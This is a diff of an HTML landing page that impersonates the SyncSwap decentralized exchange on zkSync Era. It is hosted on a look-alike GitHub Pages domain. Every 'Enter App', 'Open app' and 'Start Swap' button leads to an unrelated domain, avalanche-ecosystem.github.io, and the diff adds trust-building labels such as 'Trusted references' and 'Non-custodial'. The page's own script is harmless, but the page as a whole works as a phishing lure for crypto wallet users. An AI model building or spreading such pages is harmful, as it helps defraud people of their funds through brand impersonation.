@@ -3,22 +3,24 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>SyncSwap</title>
+  <title>SyncSwap - App</title>
   <meta name="description" content="SyncSwap is a decentralized exchange for token swaps on zkSync Era.">
   <link rel="canonical" href="https://syncswap-app.github.io/">
   <meta name="robots" content="index,follow,max-image-preview:large">
-  <meta name="theme-color" content="#F7F3EF">
+  <meta name="theme-color" content="#F6FAFF">
   <meta property="og:type" content="website">
-  <meta property="og:title" content="SyncSwap">
+  <meta property="og:title" content="SyncSwap - App">
   <meta property="og:description" content="SyncSwap is a decentralized exchange for token swaps on zkSync Era.">
   <meta property="og:url" content="https://syncswap-app.github.io/">
-  <meta property="og:image" content="https://syncswap-app.github.io/favicon.png">
-  <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="SyncSwap">
+  <meta property="og:image" content="https://syncswap-app.github.io/og-cover.png">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="SyncSwap - App">
   <meta name="twitter:description" content="SyncSwap is a decentralized exchange for token swaps on zkSync Era.">
+  <meta name="twitter:image" content="https://syncswap-app.github.io/og-cover.png">
   <link rel="icon" type="image/png" sizes="256x256" href="favicon.png">
   <link rel="apple-touch-icon" href="favicon.png">
   <link rel="manifest" href="site.webmanifest">
+  <link rel="sitemap" type="application/xml" href="sitemap.xml">
   <link rel="stylesheet" href="style.css">
   <script type="application/ld+json">
   {
@@ -33,13 +35,6 @@
         "inLanguage": "en"
       },
       {
-        "@type": "Organization",
-        "@id": "https://syncswap-app.github.io/#organization",
-        "name": "SyncSwap",
-        "url": "https://syncswap.xyz/",
-        "logo": "https://syncswap-app.github.io/favicon.png"
-      },
-      {
         "@type": "WebApplication",
         "@id": "https://syncswap-app.github.io/#app",
         "name": "SyncSwap",
@@ -47,68 +42,114 @@
         "operatingSystem": "Web",
         "url": "https://syncswap-app.github.io/",
         "description": "SyncSwap is a decentralized exchange for token swaps on zkSync Era."
+      },
+      {
+        "@type": "Organization",
+        "@id": "https://syncswap-app.github.io/#organization",
+        "name": "SyncSwap",
+        "url": "https://syncswap.xyz/",
+        "logo": "https://syncswap-app.github.io/favicon.png"
       }
     ]
   }
   </script>
 </head>
 <body>
-  <header class="topbar">
-    <a class="brand" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer" aria-label="SyncSwap home">
+  <header class="topbar" aria-label="Site header">
+    <div class="brand" aria-label="SyncSwap">
       <img src="favicon.png" width="28" height="28" alt="">
       <span>SyncSwap</span>
-    </a>
+    </div>
+    <span class="spacer" aria-hidden="true"></span>
     <nav class="nav" aria-label="Trusted references">
       <a href="https://syncswap.xyz/" target="_blank" rel="nofollow noopener noreferrer">SyncSwap</a>
       <a href="https://docs.syncswap.xyz/" target="_blank" rel="nofollow noopener noreferrer">Docs</a>
       <a href="https://explorer.zksync.io/" target="_blank" rel="nofollow noopener noreferrer">zkSync Explorer</a>
     </nav>
-    <span class="spacer"></span>
-    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
   </header>
 
-  <main class="stage">
-    <h1>SyncSwap</h1>
-    <p class="sub"><strong>SyncSwap</strong> is a decentralized exchange for token swaps on zkSync Era.</p>
-
-    <section class="swap-card" aria-label="Swap route">
-      <div class="route">
-        <div class="leg">
-          <span class="label">Pay on zkSync Era</span>
-          <span class="chip">
-            <img src="usdc.png" width="32" height="32" alt="USDC">
-            <span>USDC</span>
-          </span>
-        </div>
-        <button class="switch" type="button" data-switch aria-label="Switch swap direction">
-          <span aria-hidden="true">&#8594;</span>
-        </button>
-        <div class="leg">
-          <span class="label">Receive on zkSync Era</span>
-          <span class="chip">
-            <img src="eth.png" width="32" height="32" alt="ETH">
-            <span>ETH</span>
-          </span>
+  <main class="page">
+    <section class="hero" aria-label="SyncSwap overview">
+      <div class="copy">
+        <div class="copy-inner">
+          <h1>SyncSwap</h1>
+          <p class="deck"><strong>SyncSwap</strong> is a decentralized exchange for token swaps on zkSync Era.</p>
+          <ul class="chips" aria-label="Trust qualities">
+            <li>Best-price swaps</li>
+            <li>Non-custodial</li>
+            <li>Built on zkSync</li>
+          </ul>
+          <a class="primary hero-cta" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer nofollow">Enter App</a>
         </div>
       </div>
-      <a class="primary" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App</a>
-    </section>
-  </main>
 
-  <footer class="foot">SyncSwap &mdash; 2026</footer>
+      <section class="swap-card" aria-label="Swap preview">
+        <div class="card-head">
+          <span class="selector">zkSync Era</span>
+          <span class="preview-pill"><span class="preview-dot" aria-hidden="true"></span>Preview</span>
+        </div>
+
+        <div class="route" data-route>
+          <article class="token-panel" data-token-panel>
+            <span class="panel-label">From</span>
+            <div class="token-row">
+              <img src="eth.png" width="36" height="36" alt="ETH">
+              <span class="token-name">ETH</span>
+            </div>
+          </article>
+
+          <button class="switch" type="button" data-switch aria-label="Switch swap direction">
+            <span aria-hidden="true">&rsaquo;</span>
+          </button>
+
+          <article class="token-panel" data-token-panel>
+            <span class="panel-label">To</span>
+            <div class="token-row">
+              <img src="usdc.png" width="36" height="36" alt="USDC">
+              <span class="token-name">USDC</span>
+            </div>
+          </article>
+        </div>
+
+        <div class="route-meta" aria-label="Route preview">
+          <span>Best route</span>
+          <span class="hop-line" aria-hidden="true">
+            <i></i><i></i><i></i>
+          </span>
+          <span>Live quote in app</span>
+        </div>
+
+        <a class="primary card-cta" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer nofollow">Start Swap</a>
+      </section>
+    </section>
+
+    <div class="texture-band" aria-hidden="true">
+      <span></span>
+      <span></span>
+      <span></span>
+    </div>
+
+    <footer class="footer">
+      <p>SyncSwap &mdash; 2026</p>
+    </footer>
+  </main>
 
   <script>
   (function () {
     "use strict";
+
     var button = document.querySelector("[data-switch]");
-    if (!button) return;
+    var panels = document.querySelectorAll("[data-token-panel]");
+
+    if (!button || panels.length !== 2) return;
 
     button.addEventListener("click", function () {
-      var chips = document.querySelectorAll(".chip");
-      if (chips.length < 2) return;
-      var first = chips[0].innerHTML;
-      chips[0].innerHTML = chips[1].innerHTML;
-      chips[1].innerHTML = first;
+      var first = panels[0].querySelector(".token-row");
+      var second = panels[1].querySelector(".token-row");
+      var firstMarkup = first.innerHTML;
+
+      first.innerHTML = second.innerHTML;
+      second.innerHTML = firstMarkup;
       button.classList.toggle("is-swapped");
     });
   }());
